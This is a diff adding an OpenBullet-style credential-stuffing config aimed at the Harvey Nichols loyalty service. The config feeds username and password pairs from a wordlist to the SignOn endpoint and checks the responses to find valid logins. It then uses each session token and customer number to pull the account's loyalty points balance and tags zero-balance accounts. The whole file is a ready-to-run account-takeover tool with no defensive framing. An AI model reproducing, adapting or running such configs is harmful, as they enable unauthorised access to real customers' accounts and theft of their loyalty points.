@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "Harvey Nichols",
+  "SuggestedBots": 1,
+  "LastModified": "2019-03-28T07:09:59.2035786+01:00",
+  "AdditionalInfo": "",
+  "Author": "Fairy#6869",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://loyalty.harveynichols.com/WebCustomerLoyalty/services/CustomerLoyalty/SignOn" AutoRedirect=TRUE 
+  CONTENT "{\"CustomerSignOnRequest\":{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"applicationId\":\"CX_MOB\"}}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: " 
+  HEADER "User-Agent: okhttp/2.3.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Host: loyalty.harveynichols.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "outcome\":\"AuthFailed" 
+    KEY "outcome\":\"Fail" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+    KEY "" 
+  KEYCHAIN Failure OR 
+    KEY "outcome\":\"NoSuchRecord" 
+  KEYCHAIN Success OR 
+    KEY "outcome\":\"Success" 
+#TOKEN PARSE "<SOURCE>" JSON "token" Recursive=FALSE -> VAR "TOK" "" "" 
+#CN PARSE "<SOURCE>" JSON "customerNumber" Recursive=FALSE -> VAR "CN" "" "" 
+REQUEST POST "https://loyalty.harveynichols.com/WebCustomerLoyalty/services/CustomerLoyalty/GetProfile" AutoRedirect=TRUE 
+  CONTENT "{\"CustomerLoyaltyProfileRequest\":{\"token\":\"<TOK>\",\"customerNumber\":\"<CN>\",\"applicationId\":\"CX_MOB\"}}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "Accept: " 
+  HEADER "User-Agent: okhttp/2.3.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: loyalty.harveynichols.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+PARSE "<SOURCE>" JSON "pointsBalance" Recursive=FALSE -> CAP "Points Balance" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "pointsBalance\":0" 
